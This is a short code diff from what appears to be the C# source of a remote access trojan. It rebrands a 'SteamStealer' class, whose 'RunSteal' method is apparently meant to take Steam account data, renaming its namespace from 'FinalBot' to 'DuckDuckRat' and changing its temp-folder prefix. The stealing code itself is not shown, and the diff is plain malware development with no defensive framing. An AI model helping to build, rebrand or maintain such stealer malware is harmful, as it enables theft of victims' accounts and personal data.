@@ -6,7 +6,7 @@ using Microsoft.Win32;
 using System.Diagnostics;
 using System.Linq;
 
-namespace FinalBot.Stealers
+namespace DuckDuckRat.Stealers
 {
     public static class SteamStealer
     {
@@ -21,7 +21,7 @@ namespace FinalBot.Stealers
         public static async System.Threading.Tasks.Task<StealResult> RunSteal(Action<string> onProgress)
         {
             var result = new StealResult();
-            string tempDir = Path.Combine(Path.GetTempPath(), "Vanguard_Steam_" + Guid.NewGuid().ToString("N"));
+            string tempDir = Path.Combine(Path.GetTempPath(), "DUCK DUCK RAT v1_Steam_" + Guid.NewGuid().ToString("N"));
             
             try
             {
@@ -146,3 +146,5 @@ namespace FinalBot.Stealers
         }
     }
 }
+
+
